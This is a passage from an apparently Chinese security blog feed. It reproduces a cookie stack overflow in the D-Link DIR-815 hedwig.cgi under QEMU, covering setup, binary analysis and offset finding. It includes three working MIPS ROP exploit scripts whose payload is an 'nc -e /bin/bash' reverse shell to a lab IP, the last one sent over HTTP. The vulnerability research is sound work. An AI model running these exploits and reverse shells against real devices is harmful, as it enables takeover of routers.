href="https://people.debian.org/~aurel32/qemu/mipsel/">https://people.debian.org/~aurel32/qemu/mipsel/</a></p><p>qemu-system-mipsel，系统模拟，下载mips内核镜像和文件系统</p><ul><li><code>debian_squeeze_mipsel_standard.qcow2</code>是文件系统</li><li><code>vmlinux-3.2.0-4-4kc-malta</code>是内核镜像</li></ul><p>qemu启动脚本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mipsel \</span><br><span class="line">-M malta \</span><br><span class="line">-kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">-hda debian_squeeze_mipsel_standard.qcow2 \</span><br><span class="line">-append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> \</span><br><span class="line">-net nic \</span><br><span class="line">-net tap \</span><br><span class="line">-nographic \</span><br></pre></td></tr></table></figure><p>网络配置：</p><p>网络配置工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install bridge-utils uml-utilities</span><br></pre></td></tr></table></figure><p>配置下网络：</p><p>ubuntu:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -w net.ipv4.ip\_forward=1  </span><br><span class="line">sudo iptables -F  </span><br><span class="line">sudo iptables -X  </span><br><span class="line">sudo iptables -t nat -F  </span><br><span class="line">sudo iptables -t nat -X  </span><br><span class="line">sudo iptables -t mangle -F  </span><br><span class="line">sudo iptables -t mangle -X  </span><br><span class="line">sudo iptables -P INPUT ACCEPT  </span><br><span class="line">sudo iptables -P FORWARD ACCEPT  </span><br><span class="line">sudo iptables -P OUTPUT ACCEPT  </span><br><span class="line">sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE  </span><br><span class="line">sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT  </span><br><span class="line">sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT  </span><br><span class="line">sudo ifconfig tap0 192.168.100.254 netmask 255.255.255.0</span><br></pre></td></tr></table></figure><p>qemu:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 192.168.100.2 netmask 255.255.255.0  </span><br><span class="line">route add default gw 192.168.100.254</span><br></pre></td></tr></table></figure><p>可以ping通：</p><p><img src="/2022/10/23/DIR815/image-20221021222854115.png" alt="image-20221021222854115"></p><p>auto.sh并执行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">cp http_conf /</span><br><span class="line">cp sbin/httpd /</span><br><span class="line">cp -rf htdocs/ /</span><br><span class="line">mkdir /etc_bak</span><br><span class="line">cp -r /etc /etc_bak</span><br><span class="line">rm /etc/services</span><br><span class="line">cp -rf etc/ /</span><br><span class="line">cp lib/ld-uClibc-0.9.30.1.so  /lib/</span><br><span class="line">cp lib/libcrypt-0.9.30.1.so  /lib/</span><br><span class="line">cp lib/libc.so.0  /lib/</span><br><span class="line">cp lib/libgcc_s.so.1  /lib/</span><br><span class="line">cp lib/ld-uClibc.so.0  /lib/</span><br><span class="line">cp lib/libcrypt.so.0  /lib/</span><br><span class="line">cp lib/libgcc_s.so  /lib/</span><br><span class="line">cp lib/libuClibc-0.9.30.1.so  /lib/</span><br><span class="line"><span class="built_in">cd</span> /</span><br><span class="line">rm -rf /htdocs/web/hedwig.cgi</span><br><span class="line">rm -rf /usr/sbin/phpcgi</span><br><span class="line">rm -rf /usr/sbin/hnap</span><br><span class="line">ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi</span><br><span class="line">ln -s /htdocs/cgibin /usr/sbin/phpcgi</span><br><span class="line">ln -s  /htdocs/cgibin /usr/sbin/hnap</span><br><span class="line">./httpd -f http_conf</span><br></pre></td></tr></table></figure><p>其中<code>http_conf</code>配置文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">Umask 026  </span><br><span class="line">PIDFile /var/run/httpd.pid  </span><br><span class="line">LogGMT On  #开启log  </span><br><span class="line">ErrorLog /log #log文件  </span><br><span class="line">Tuning  </span><br><span class="line">&#123;  </span><br><span class="line">    NumConnections 15  </span><br><span class="line">    BufSize 12288  </span><br><span class="line">    InputBufSize 4096  </span><br><span class="line">    ScriptBufSize 4096  </span><br><span class="line">    NumHeaders 100  </span><br><span class="line">    Timeout 60  </span><br><span class="line">    ScriptTimeout 60  </span><br><span class="line">&#125;  </span><br><span class="line">Control  </span><br><span class="line">&#123;  </span><br><span class="line">    Types  </span><br><span class="line">    &#123;  </span><br><span class="line">        text/html    &#123; html htm &#125;  </span><br><span class="line">        text/xml    &#123; xml &#125;  </span><br><span class="line">        text/plain    &#123; txt &#125;  </span><br><span class="line">        image/gif    &#123; gif &#125;  </span><br><span class="line">        image/jpeg    &#123; jpg &#125;  </span><br><span class="line">        text/css    &#123; css &#125;  </span><br><span class="line">        application/octet-stream &#123; \* &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    Specials  </span><br><span class="line">    &#123;  </span><br><span class="line">        Dump        &#123; /dump &#125;  </span><br><span class="line">        CGI            &#123; cgi &#125;  </span><br><span class="line">        Imagemap    &#123; map &#125;  </span><br><span class="line">        Redirect    &#123; url &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    External  </span><br><span class="line">    &#123;  </span><br><span class="line">        /usr/sbin/phpcgi &#123; php &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">Server  </span><br><span class="line">&#123;  </span><br><span class="line">    ServerName &quot;Linux, HTTP/1.1, &quot;  </span><br><span class="line">    ServerId &quot;1234&quot;  </span><br><span class="line">    Family inet  </span><br><span class="line">    Interface eth0         #网卡  </span><br><span class="line">    Address 192.168.100.2  #qemu ip  </span><br><span class="line">    Port &quot;4444&quot;            #port </span><br><span class="line">    Virtual  </span><br><span class="line">    &#123;  </span><br><span class="line">        AnyHost  </span><br><span class="line">        Control  </span><br><span class="line">        &#123;  </span><br><span class="line">            Alias /  </span><br><span class="line">            Location /htdocs/web  </span><br><span class="line">            IndexNames &#123; index.php &#125;  </span><br><span class="line">            External  </span><br><span class="line">            &#123;  </span><br><span class="line">                /usr/sbin/phpcgi &#123; router\_info.xml &#125;  </span><br><span class="line">                /usr/sbin/phpcgi &#123; post\_login.xml &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        Control  </span><br><span class="line">        &#123;  </span><br><span class="line">            Alias /HNAP1  </span><br><span class="line">            Location /htdocs/HNAP1  </span><br><span class="line">            External  </span><br><span class="line">            &#123;  </span><br><span class="line">                /usr/sbin/hnap &#123; hnap &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">            IndexNames &#123; index.hnap &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上传到qemu：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r squashfs-root/ root@192.168.100.2:/root</span><br></pre></td></tr></table></figure><p>服务正常启动：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:<span class="comment">//192.168.100.2:4444/hedwig.cgi -v -X POST -H &quot;Content-Length: 8&quot; -b &quot;uid=zh&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/10/23/DIR815/image-20221022125353861.png" alt="image-20221022125353861"></p><p>退出qemu的话要恢复下<code>etc</code>文件夹：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">rm -rf /etc</span><br><span class="line">mv /etc_bak/etc /etc</span><br><span class="line">rm -rf /etc_bak</span><br></pre></td></tr></table></figure><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>DIR-815，exp：<a href="https://www.exploit-db.com/exploits/33863">https://www.exploit-db.com/exploits/33863</a></p><p>可以看到是cookie的输入有漏洞，</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">begin</span></span><br><span class="line">  res = send_request_cgi(&#123;</span><br><span class="line">    <span class="string">&#x27;method&#x27;</span> =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;/hedwig.cgi&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;cookie&#x27;</span>   =&gt; <span class="string">&quot;uid=<span class="subst">#&#123;shellcode&#125;</span>&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;encode_params&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&#x27;vars_post&#x27;</span> =&gt; &#123;</span><br><span class="line">      rand_text_alpha(<span class="number">4</span>) =&gt; rand_text_alpha(<span class="number">4</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line"><span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Rex</span><span class="symbol">:</span><span class="symbol">:ConnectionError</span></span><br><span class="line">  fail_with(Failure::Unreachable, <span class="string">&quot;<span class="subst">#&#123;peer&#125;</span> - Failed to connect to the web server&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>ida查看cookie的字符串发现只有一处交叉引用，</p><p><img src="/2022/10/23/DIR815/image-20221022222144259.png" alt="image-20221022222144259"></p><p><code>sess_get_uid</code>的交叉引用：</p><p><img src="/2022/10/23/DIR815/image-20221022222317647.png" alt="image-20221022222317647"></p><p>漏洞点就在<code>sess_get_uid</code>后面的<code>sprintf</code>，一共有两处，下面从main的头分析下：</p><p>首先判断请求的方式，必须是POST请求，之后走<code>cgibin_parse_request</code>函数：</p><p><img src="/2022/10/23/DIR815/image-20221022223442719.png" alt="image-20221022223442719"></p><p><code>cgibin_parse_request</code>函数会取出来几个环境变量的值：<code>CONTENT_TYPE</code>，<code>CONTENT_LENGTH</code>，<code>REQUEST_URI</code>，这个函数之后再分析</p><p>接下来会执行<code>sess_get_uid</code>函数：</p><p>首先取出<code>HTTP_COOKIE</code>的值：</p><p><img src="/2022/10/23/DIR815/image-20221022223911324.png" alt="image-20221022223911324"></p><p>之后将等号前的值给v2：</p><p><img src="/2022/10/23/DIR815/image-20221022223936865.png" alt="image-20221022223936865"></p><p>其中<code>sobj_add_char(a1,a2)</code>是将a2前的值给a1：</p><p><img src="/2022/10/23/DIR815/image-20221022224045488.png" alt="image-20221022224045488"></p><p>以及将等号之后的值给v4：</p><p><img src="/2022/10/23/DIR815/image-20221022224204572.png" alt="image-20221022224204572"></p><p>再之后判断<code>v2</code>为<code>uid</code>的话将<code>UID</code>的值给<code>v8</code>，然后拼接到<code>a1</code>(也就是<code>main</code>中传进来的<code>v4</code>)</p><p><img src="/2022/10/23/DIR815/image-20221022224426492.png" alt="image-20221022224426492"></p><p>然后就是第一个栈溢出的点</p><p>之后是两个判断：</p><p><img src="/2022/10/23/DIR815/image-20221022224838974.png" alt="image-20221022224838974"></p><p>其中第一个判断要有<code>/var/tmp/</code>这个文件夹，第二个判断<code>haystack</code>在<code>cgibin_parse_request</code>的第一个参数可以操作：</p><p><img src="/2022/10/23/DIR815/image-20221022225102838.png" alt="image-20221022225102838"></p><p>也就是说要走到这里才可以(其中的a1就是<code>sub_409A6C</code>)，其中最早的有个判断<code>v9!=-1</code>，<code>CONTENT_TYPE</code>不能为空：</p><p><img src="/2022/10/23/DIR815/image-20221022225208255.png" alt="image-20221022225208255"></p><p><code>cgibin_parse_request</code>函数首先获取几个值，其中<code>REQUEST_URI</code>不能为空：</p><p><img src="/2022/10/23/DIR815/image-20221022225442519.png" alt="image-20221022225442519"></p><p>后面还有个<code>sprintf</code>，其中的v4没有变过</p><p><img src="/2022/10/23/DIR815/image-20221022230300494.png" alt="image-20221022230300494"></p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><p>有两种方式，一种是将写好的payload放到qemu执行，还有一种是直接发送http请求。</p><h2 id="qemu执行exp"><a href="#qemu执行exp" class="headerlink" title="qemu执行exp"></a>qemu执行exp</h2><p>其中的test就是gdb的cyclic生成的字符串</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash  </span></span><br><span class="line"><span class="built_in">export</span> CONTENT_TYPE=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>  </span><br><span class="line"><span class="built_in">export</span> HTTP_COOKIE=<span class="string">&quot;uid=`cat test`&quot;</span>  </span><br><span class="line"><span class="built_in">export</span> CONTENT_LENGTH=$(<span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$HTTP_COOKIE</span>&quot;</span> | wc -c)  </span><br><span class="line"><span class="built_in">export</span> REQUEST_METHOD=<span class="string">&quot;POST&quot;</span>  </span><br><span class="line"><span class="built_in">export</span> REQUEST\_URI=<span class="string">&quot;/hedwig.cgi&quot;</span>  </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;uid=1111&quot;</span>|./gdbserver.mipsle 192.168.111.131:6666 /htdocs/web/hedwig.cgi  </span><br><span class="line"><span class="comment">#echo &quot;uid=1111&quot;|/htdocs/web/hedwig.cgi</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch htdocs/cgibin</span><br><span class="line"><span class="built_in">set</span> architecture mips</span><br><span class="line">target remote 192.168.100.2:6666</span><br><span class="line">b hedwigcgi_main</span><br><span class="line">b *0x409a50</span><br><span class="line">b *0x00409A28</span><br></pre></td></tr></table></figure><p>可以看到偏移为1009</p><p><img src="/2022/10/23/DIR815/image-20221022232531539.png" alt="image-20221022232531539"></p><p>重新写下看看偏移是否是1009：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash  </span></span><br><span class="line"><span class="built_in">export</span> CONTENT_TYPE=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>  </span><br><span class="line"><span class="built_in">export</span> HTTP_COOKIE=$(python -c <span class="string">&quot;print &#x27;uid=&#x27; + &#x27;A&#x27;\*1009 + &#x27;0000&#x27;&quot;</span>)   </span><br><span class="line"><span class="built_in">export</span> CONTENT_LENGTH=$(<span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$HTTP_COOKIE</span>&quot;</span> | wc -c)  </span><br><span class="line"><span class="built_in">export</span> REQUEST_METHOD=<span class="string">&quot;POST&quot;</span>  </span><br><span class="line"><span class="built_in">export</span> REQUEST\_URI=<span class="string">&quot;/hedwig.cgi&quot;</span>  </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;uid=1111&quot;</span>|./gdbserver.mipsle 192.168.111.131:6666 /htdocs/web/hedwig.cgi  </span><br><span class="line"><span class="comment">#echo &quot;uid=1111&quot;|/htdocs/web/hedwig.cgi</span></span><br></pre></td></tr></table></figure><p>可以看到确实是1009</p><p><img src="/2022/10/23/DIR815/image-20221022233231458.png" alt="image-20221022233231458"></p><p>libc基址：<code>0x77f34000</code></p><p><img src="/2022/10/23/DIR815/image-20221022233327357.png" alt="image-20221022233327357"></p><p><img src="/2022/10/23/DIR815/image-20221022233947740.png" alt="image-20221022233947740"></p><p>其中的system，加上libc的base就是<code>0x767a8b200</code>，为了防止<code>00</code>，先减一，之后找个gadget加一就行</p><p><img src="/2022/10/23/DIR815/image-20221022234213409.png" alt="image-20221022234213409"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">cmd = <span class="string">b&#x27;nc -e /bin/bash 192.168.111.138 8888&#x27;</span></span><br><span class="line"> </span><br><span class="line">libc_base = <span class="number">0x77f34000</span></span><br><span class="line">system_addr_1 = <span class="number">0x53200</span> - <span class="number">1</span></span><br><span class="line">gadget1 = <span class="number">0x32A98</span></span><br><span class="line">gadget2 = <span class="number">0x169C4</span></span><br><span class="line"><span class="comment">#.text:000169C4                 addiu   $s2, $sp, 0x170+var_158//0x18</span></span><br><span class="line"><span class="comment">#.text:000169C8                 move    $a2, $v1</span></span><br><span class="line"><span class="comment">#.text:000169CC                 move    $t9, $s0</span></span><br><span class="line"><span class="comment">#.text:000169D0                 jalr    $t9 ; mempcpy</span></span><br><span class="line"><span class="comment">#.text:000169D4                 move    $a0, $s2</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">973</span> <span class="comment"># 1009-4*9</span></span><br><span class="line">payload += p32(libc_base + system_addr_1) <span class="comment"># s0  system_addr- 1</span></span><br><span class="line">payload += p32(libc_base + gadget2) <span class="comment"># s1  </span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">7</span>)</span><br><span class="line">payload += p32(libc_base + gadget1) <span class="comment"># ra  addiu $s0, 1 ; jalr $s1</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += cmd</span><br><span class="line"> </span><br><span class="line">fd = <span class="built_in">open</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">fd.write(payload)</span><br><span class="line">fd.close()</span><br></pre></td></tr></table></figure><p>exp2:</p><p>这个就是<a href="https://www.exploit-db.com/exploits/33863%E6%94%B9%E7%9A%84">https://www.exploit-db.com/exploits/33863改的</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">cmd = <span class="string">b&#x27;nc -e /bin/bash 192.168.111.138 8888&#x27;</span></span><br><span class="line"> </span><br><span class="line">libc_base = <span class="number">0x77f34000</span></span><br><span class="line">system_addr_1 = <span class="number">0x53200</span> - <span class="number">1</span></span><br><span class="line">gadget1 = <span class="number">0x00158C8</span></span><br><span class="line"><span class="comment">#.text:000158C8                 move    $t9, $s5</span></span><br><span class="line"><span class="comment">#.text:000158CC                 jalr    $t9</span></span><br><span class="line"><span class="comment">#.text:000158D0                 addiu   $s0, 1</span></span><br><span class="line">gadget2 = <span class="number">0x000159CC</span></span><br><span class="line"><span class="comment">#.text:000159CC                 addiu   $s5, $sp, 0x14C+var_13C</span></span><br><span class="line"><span class="comment"># ......</span></span><br><span class="line"><span class="comment">#.text:000159D8                 move    $t9, $s0</span></span><br><span class="line"><span class="comment">#.text:000159DC                 jalr    $t9 ; mempcpy</span></span><br><span class="line"><span class="comment">#.text:000159E0                 move    $a0, $s5</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">973</span> <span class="comment"># 1009-4*9</span></span><br><span class="line">payload += p32(libc_base + system_addr_1) <span class="comment"># s0  system_addr- 1</span></span><br><span class="line">payload +=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">4</span>)<span class="comment"># $s1 - $s4</span></span><br><span class="line">payload += p32(libc_base + gadget2) <span class="comment"># s5</span></span><br><span class="line">payload +=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">3</span>)<span class="comment"># $s6 - $fp</span></span><br><span class="line">payload += p32(libc_base + gadget1) <span class="comment"># ra  move $t9, $s5 ; jalr $s5;addiu $s0, 1</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload += cmd</span><br><span class="line"> </span><br><span class="line">fd = <span class="built_in">open</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">fd.write(payload)</span><br><span class="line">fd.close()</span><br></pre></td></tr></table></figure><p><img src="/2022/10/23/DIR815/image-20221023175756580.png" alt="image-20221023175756580"></p><h2 id="http请求发payload："><a href="#http请求发payload：" class="headerlink" title="http请求发payload："></a>http请求发payload：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">cmd = <span class="string">b&#x27;nc -e /bin/bash 192.168.111.138 8888&#x27;</span></span><br><span class="line"> </span><br><span class="line">libc_base = <span class="number">0x77f34000</span></span><br><span class="line">system_addr_1 = <span class="number">0x53200</span> - <span class="number">1</span></span><br><span class="line">gadget1 = <span class="number">0x32A98</span></span><br><span class="line">gadget2 = <span class="number">0x169C4</span></span><br><span class="line"><span class="comment">#.text:000169C4                 addiu   $s2, $sp, 0x170+var_158//0x18</span></span><br><span class="line"><span class="comment">#.text:000169C8                 move    $a2, $v1</span></span><br><span class="line"><span class="comment">#.text:000169CC                 move    $t9, $s0</span></span><br><span class="line"><span class="comment">#.text:000169D0                 jalr    $t9 ; mempcpy</span></span><br><span class="line"><span class="comment">#.text:000169D4                 move    $a0, $s2</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">973</span> <span class="comment"># 1009-4*9</span></span><br><span class="line">payload += p32(libc_base + system_addr_1) <span class="comment"># s0  system_addr- 1</span></span><br><span class="line">payload += p32(libc_base + gadget2) <span class="comment"># s1  </span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">7</span>)</span><br><span class="line">payload += p32(libc_base + gadget1) <span class="comment"># ra  addiu $s0, 1 ; jalr $s1</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += cmd</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://192.168.100.2:4444/hedwig.cgi&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;aaa&quot;</span> : <span class="string">&quot;pwner&quot;</span>&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>        : <span class="string">b&quot;uid=&quot;</span> + payload,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>  : <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Length&quot;</span>: <span class="string">&quot;1111&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url = url, headers = headers, data = data)</span><br></pre></td></tr></table></figure><p>也是可以打通的：</p><p><img src="/2022/10/23/DIR815/image-20221023191111373.png" alt="image-20221023191111373"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;没玩过IOT，搞个简单的分析下&lt;/p&gt;
&lt;p&gt;踩了非常多的坑，光环境就搞了好久，，QAQ&lt;/p&gt;
&lt;h1 id=&quot;MIPS架构特性&quot;&gt;&lt;a href=&quot;#MIPS架构特性&quot; class=&quot;headerlink&quot; title=&quot;MIPS架构特性&quot;&gt;&lt;/a&gt;MIPS架构特性&lt;/</summary>
      
    
    
    
    <category term="Technology" scheme="https://ghostasky.github.io/categories/Technology/"/>
    
    
    <category term="漏洞复现" scheme="https://ghostasky.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Windows Program Learn_0x1</title>
